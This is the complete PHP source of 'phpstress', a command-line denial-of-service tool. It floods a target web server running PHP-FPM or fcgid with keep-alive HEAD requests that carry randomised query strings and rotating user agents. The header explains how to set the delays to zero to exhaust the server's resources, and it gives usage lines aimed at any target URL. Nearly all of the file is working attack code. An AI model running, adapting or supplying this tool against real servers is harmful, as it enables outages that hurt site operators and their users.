<?php
#!/usr/bin/php
/*

File: phpstress.php
Written by: d4rk0  / @d4rk0s
Concept by: Vinny Troia / @VinnyTroia
Night Lion Security (http://www.nightlionsecurity.com)
---------------------------------------------------------------------
Description: 
    This is a light-weight low-bandwidth required PHP script that creates 
    a type of denial of service on a Linux-based Apache or NGINX web server
    that process PHP content with PHP-CGI (fcgid) or PHP-FPM (Apache or NGINX). 
    The script will create a number of fake PHP connections, causing the server 
    to quickly launch additional processes to meet the new demand. In addition, 
    the server's connections are kept open (via keep-alive), causing the server
    to quickly run out of resources. 

    In order to completely max out the server's
    resources, the script's delay parms need to both be set to 0. 

    For more information, please view the complete post at 
    http://www.nightlionsecurity.com/blog/
----------------------------------------------------------------------
Disclaimer:
    Don't be a dick. 
----------------------------------------------------------------------
Usage:
    php phpstress.php http://www.target.com/?r=%r% -m 1000000000 -k Y -c 150 -d 0.5 -r 0.01

    OR

    php phpstress.php www.target.com/wp-content/?r=%r% 

    Socks Proxy: * NOT IN ALPHA VERSION
    -s = Y or N / 127.0.0.1:9050 Username:Pw
           Default is N leaving out Username:Pw means there is no Username and Password
           Edit the phpstress.socks file if you want to use a socks proxy
----------------------------------------
Commands:
	Target URL picking a resource intense page and inserting %r where the GET variables data is will generate random chars 
  
    -m  = Maximum requests not specifying this will leave it at a large default number to exit script on
          *nix flavored simply press control c to kill the program and exit or whatever TTY command you have setup
          to exit a program on command line
           Default value is 1000000000

    -k  = Y or N  Keep Alive Check will check if Server uses the Keep-Alive Option to keep the connection alive
           Default value is Y            

    -c = Maximum Request Per Connection each connection opened will then request D number of times
           Default value of 150
    
    -d = Delay Between Connections The number of seconds to delay between opening a new connection.
           Default value: 0.5
   
    -r = Delay Between Requests The number of seconds to delay between outgoing requests.
           Default value: 0.04

*/
// BEGIN SCRIPT
error_reporting(0);
// make sure script has no time limit for execution
set_time_limit(0);


/*
 Randomly pick a UserAgent for deployment on page request
 PARAM: None
 RETURN: returns a random user agent string
*/
function userAgentRand(){

  // lets create our array with random user agents
  $userArray = array("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; RW; rv:1.8.0.7) Gecko/20110321 MultiZilla/4.33.2.6a SeaMonkey/8.6.55",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:1.8.0.7) Gecko/20110321 MultiZilla/4.33.2.6a SeaMonkey/8.6.55",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-gb) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; de-de) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)".
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10".
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.2; RW; rv:7.0a1) Gecko/20091211 SeaMonkey/9.23a1pre",
"Mozilla/5.0 (Windows NT 5.2; RW; rv:7.0a1) Gecko/20091211 SeaMonkey/9.23a1pre");


  // Lets shuffle our array 
  shuffle($userArray);
  // count how many user agents in array
  $count = count($userArray);
  // minus one to adjust starting at 0
  $count = mt_rand(0,$count-1);
  // return "Random" User Agent
  return $userArray[$count];

}




/*
 Function used for adding random string to request urls
 PARAM: none
 RETURN: returns random string of chars
*/
function quick_rand(){
  $rand_string = "";
  $letters = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
  for($i=0;$i<mt_rand(5,16);$i++){
    $rand_string.=$letters[array_rand($letters)];
  }
  return($rand_string);
}



/*
 Parse the target URL to return the host, path and query
 PARAM: the URL string to be parsed
 RETURN: returns an array of host path & query
*/
function parseUrl($target_url){



  $t = "";
  $t = strpos($target_url,'http://');
  if ($t === false) {
    $target_url = "http://". $target_url;
  }

  $target_url_parsed = parse_url($target_url);

  $target_url = array();
  $target_url['scheme'] = $target_url_parsed['scheme'];
  $target_url['host'] = $target_url_parsed['host'];
  $target_url['path'] = $target_url_parsed['path'];
  $target_url['query'] = $target_url_parsed['query'];
  $target_url['port'] = $target_url_parsed['port'];

  if(!$target_url['path']){
    $target_url['path'] = '/';
  }

  if(!$target_url['port']){
    $target_url['port'] = 80;
  }
  
  if ($target_url['scheme']){
    // return Parsed Array for Deployment and usage
    return $target_url;
  }else{
    // return proper url array
    $target_url['host'] = "http://". $target_url['host'];
    return $target_url;
  }


}



/*
 Check Query if none just append path if both append path + query
 PARAM: the parsed array of target url
 RETURN: return appended array
*/
function checkQuery($target_url){

  if($target_url['query']){
   $request_url = $target_url['path']."?".$target_url['query'];
  } else {
   $request_url = $target_url['path'];
  }
  // return request url
  return $request_url;
}


/*
 check if user is launching this from command line or browser
 PARAM: none
 RETURN: return 1=browser or 0=command line
*/
function checkCommandLine(){
  if(defined('STDIN')){ 
   $num = 0;
  }else{ 
    $num = 1;
  }
  return $num;
}



/*
 Check if the remote host supports Keep-Alive
 PARAM: parsed target URL
 RETURN: either keep-alive or server doesn't support keep alive string 
*/
function keepAlive($target_url){

  // Grab random user agent
  $useragent = userAgentRand();

  // Send request with Keep-Alive header
  $socket = fsockopen($target_url['host'], $target_url['port'], $errno, $errstr, 3);
  // if connection cant open
  if(!$socket){
    die("Uh-oh: Failed to open a connection to ".$target_url['host']." on port ".$target_url['port']."\n\n");
  }



  // lets build payload for keep-alive check
  $request = "HEAD / HTTP/1.1\r\nHOST: ".$target_url['host']."\r\nUser-Agent: ".
  $useragent."\r\nConnection: Keep-Alive\r\n\r\n";
  
  
  fwrite($socket, $request);
  $reply = "";
  // loop until end of buffer and socket stream
  while (!feof($socket)){

    $buffer=fgets($socket, 128);
    $reply.=$buffer;

    //Watch for end of reply and close socket/break out of loop
    if($buffer == "\r\n"){
      fclose($socket); break;
    }
  }


  //Check if the reply to our above request includes 'Connection: close
  if(strpos($reply, "Connection: close")){
   return "NO:KEEP-ALIVE";
  }else{ return "KEEP-ALIVE"; }   


}


/*
 This is the actual attack that will test the stress on the server
PARAM: target_url , request url , max requests , max request per connection
RETURN: returns TRUE
*/
function sendphpstress($target_url,$request_url,$mr,$mpc,$dbr,$dbc){

  // max requests divided by max requests per connection
  $max_connections = ceil($mr / $mpc);

  echo "[!] To exit press control C or whatever TTY options are set to exit command line program\n\n\n";
  // lets loop through connections
  for($c=0;$c<$max_connections;$c++){ 

    echo "Opening connection [".($c+1)."] to ".$target_url['host']."..";
    @$attack_socket = fsockopen($target_url['host'], $target_url['port'], $errno, $error, 3);

    // cant open socket display fail
    if(!$attack_socket){
      echo "failed (".$error.")"."\n";
    } else {

      // Success lets send out connections
      echo "success"."\n"."Sending requests: |";

      //Stay within our max_requests_per_connection limit
      for($r=0;$r<$mpc;$r++){
        // grab a ran user agent
        $useragent = userAgentRand();

        // build payload for attack
        $request = "HEAD ".str_replace("%r%", quick_rand(), $request_url)." HTTP/1.1\r\nHOST: ".$target_url['host']."\r\nUser-Agent: ".$useragent."\r\nConnection: Keep-Alive\r\n\r\n";

        // write socket and make connection        
        @fwrite($attack_socket, $request);

        echo ".";

        // Delay between requests 1 second requests
        usleep($dbr * 1000000); 

      }

    echo "|"."\n";

  }

  @fclose($attack_socket);
  
  echo "Closed connection"."\n";
  // amount of time to delay between connections
  usleep($dbc * 1000000);

 }

 return True;

}



/*
 This function takes all the commands and outputs them strips them and gets them ready for proper use
PARAM: the argv array of commands to be processed
RETURN: returns processed array or FALSE for error
*/
function inputCommand($commands){

  // Take Commands Being Passed return values as array
  $outputCommand = array();
  // count number of commands for loop
  $count = count($commands);

  // loop through commands	
  for ($d = 0; $d < $count; $d++){
    // lets build commands
    switch ($commands[$d]){

      // Display help list of commands and exit 		
      case "--help":	
        return "HELP"; 
      // Display help list of commands and exit         		 
      case "-": 
        return "HELP";
  
      // socks proxy   				
      case "-s":	
        $outputCommand[] = "-s";
        // Grab Type /////////////////
        $new_number = $d++;
        $value = $commands[$d];
        $outputCommand[$new_number] = $value; // Append data to Array	
        break;


      // target
      case "-t":			
        $outputCommand[] = "-t";
        // Grab Type /////////////////
        $new_number = $d++;
        $value = $commands[$d];
        $outputCommand[$new_number] = $value; // Append data to Array	
        // Grab Target ////////////////
        break;
   
      // maximum requests
      case "-m":			
        $outputCommand[] = "-m";
        // Grab Type /////////////////
        $new_number = $d++;
        $value = $commands[$d];
        $outputCommand[$new_number] = $value; // Append data to Array	
        // Grab Target ////////////////
        break;

      // keep alive yes or no
      case "-k":			
        $outputCommand[] = "-k";
        // Grab Type /////////////////
        $new_number = $d++;
        $value = $commands[$d];
        $outputCommand[$new_number] = $value; // Append data to Array	
        break;

      // maximum request per connection
      case "-c":			
        $outputCommand[] = "-c";
        // Grab Type /////////////////
        $new_number = $d++;
        $value = $commands[$d];
        $outputCommand[$new_number] = $value; // Append data to Array	
        break;

      // delay between connections		
      case "-d":			
        $outputCommand[] = "-d";
        // Grab Type /////////////////
        $new_number = $d++;
        $value = $commands[$d];
        $outputCommand[$new_number] = $value; // Append data to Array	
        break;

      // delay between requests
      case "-r":			
        $outputCommand[] = "-r";
        // Grab Type /////////////////
        $new_number = $d++;
        $value = $commands[$d];
        $outputCommand[$new_number] = $value; // Append data to Array	
        break;

         
 		
    }

  }

  // return array with results
  return $outputCommand; 



}
  
/*
 Check if we are on command line or not
PARAM: NONE
RETURN: NONE exits if true
*/
function commandLineCheck(){
  // Check if not command line exit dont do anything
  if ($num = checkCommandLine() === 1){
    // return error to user and quit script
    echo "<h1><B>Error: phpstress only runs from command line prompt</b></h1>";
    exit(0);
  }

}


/*
 Displays the Help menu showing all available program commands
PARAM: NONE
RETURN: NONE exits 
*/
function displayHelp(){
    echo "    
PHPStress 1.0
Usage: php phpstress.php [url] [options]

OPTIONS:
-t: Target URL picking a resource intense page and inserting %r 
    where the GET variables data is will generate random chars 
		
-m: Maximum requests not specifying this will leave it at a large default number 
    Default value is 1000000000

-k: Keep Alive Check will check if Server uses the Keep-Alive Option 
    to keep the connection alive (Y or N)  
    Default value is Y            

-c: Maximum Request Per Connection each connection opened will 
    then request D number of times
    Default value of 150

-d: Delay Between Connections - The number of seconds to delay 
    between opening a new connection.
    Default value: 0.5

-r: Delay Between Requests The number of seconds to delay between 
    outgoing requests
    Default value: 0.04 \n\n";
    exit(0);

}


/// END FUNCTIONS BEGIN ACTUAL SCRIPT
//*********************************************************
// check if on command line
commandLineCheck();


// sleep for a couple seconds before going
//echo "  [X] Processing Commands Now lets begin Attack.";
//@usleep(1000666);

// check if arguments on commmand line are present
if (isset($argv[1])) {
  // Process commands now
  $results = inputCommand($argv);
  // display help
  if ($results === "HELP"){
    // display help
    displayHelp();
  }


  // Set  counter Values
  $d = 0;
  $num = "";
  /////////////////////
  // Set Program Default Variables
  $target_url = "";
  $socks = "n";
  $k = "y";
  $mr = 10000000;
  $mpc = 150;
  $dbr = 0.02;
  $dbc = 0.7;




  // lets assign all variables now and get ready for attack
  foreach($results as $key=>$com){

    // Socks proxy default N
    if ($com == "-s"){
      $r = $key;
      if ($r == 0){ $r++;$r++; }else{
      $r++;}
      $socks = $results[$r];
    }
    // Maximum requests Default is 100000000
    if ($com == "-m"){
      $r = $key;
      if ($r == 0){ $r++;$r++; }else{
      $r++;}
      $mr = $results[$r];
    }
    // Check is server keep alive? default is Y
    if ($com == "-k"){
      $r = $key;
      if ($r == 0){ $r++;$r++; }else{
      $r++;}
      $k = $results[$r];
    }
    // Max request per connection
    if ($com == "-c"){
      $r = $key;
      if ($r == 0){ $r++;$r++; }else{
      $r++;}
      $mpr = $results[$r];
    }
    // delay between connections
    if ($com == "-d"){
      $r = $key;
      if ($r == 0){ $r++;$r++; }else{
      $r++;}
      $dbc = $results[$r];
    }
    // delay between requests
    if ($com == "-r"){
      $r = $key;
      if ($r == 0){ $r++;$r++; }else{
      $r++;}
      $dbr = $results[$r];
    }
  }


  // append url now
  $target_url = $argv[1];

  // Lets now check and set Default values
  if (($target_url == "") || empty($target_url)){
    // Error no Target URL set
    echo "   [!]  ERROR: No Target URL set. \n";
    exit(0);
  }


  // Socks check now  
  if ((strtolower($socks) == "n") || (strtolower($socks) == "y")){}else{
    // error socks is either a n or y question 
    echo "   [!]  ERROR: Socks is either a [y]es or [n]o question\n\n";
    exit(0);
  }

  // keep alive 
  if (strtolower($k) != "n" || strtolower($k) != "y"){}else{
    // error socks is either a n or y question 
    echo "   [!]  ERROR: Keep Alive is either a [y]es or [n]o question\n";
    exit(0);
  }

  // Max request check now
  if ((is_numeric($mr)) || ($mr != "") || (!empty($mr))){}else{
    // error max request is not a number 
    echo "   [!]  ERROR: Max Request must be a valid number. Default is 100000000\n";
    exit(0);
  }  

  // Max per connection
  if ((is_numeric($mpc)) || ($mpc != "") || (!empty($mpc))){}else{
    // error max request is not a number 
    echo "   [!]  ERROR: Max Request Per Connection is invalid. Default is 150\n";
    exit(0);
  }  

  // Delay between request
  if ((is_numeric($dbr)) || ($dbr != "") || (!empty($dbr))){}else{
    // error
    echo "   [!]  ERROR: Delay between requests is invalid. Default is 0.04 seconds. \n";
    exit(0);
  }  

  // Delay between connections
  if ((is_numeric($dbc)) || ($dbc != "") || (!empty($dbc))){}else{
    // error 
    echo "   [!]  ERROR: Delay between connections is invalid. Default is 0.5 seconds. \n";
    exit(0);
  }  

}else{
  // display help
  displayHelp();
  exit(0);
} 



// parse target url return a parsed array
$target_url = parseUrl($target_url);
// check if query empty or not empty
$request_url = checkQuery($target_url);


if ($k == "y"){
  // check if server supports keep-alive make sure its a parsed target url
  $keepAlive = keepAlive($target_url);
  // Switch to check results if server keeps alive
  switch ($keepAlive){
    case "NO:KEEP-ALIVE":
      $mpc = 1;
      break;
    case "KEEP-ALIVE":
      $mpc = 100;
      break;
  }
}



// send out payloads and connection
sendphpstress($target_url,$request_url,$mr,$mpc,$dbr,$dbc);



// EOF
?>
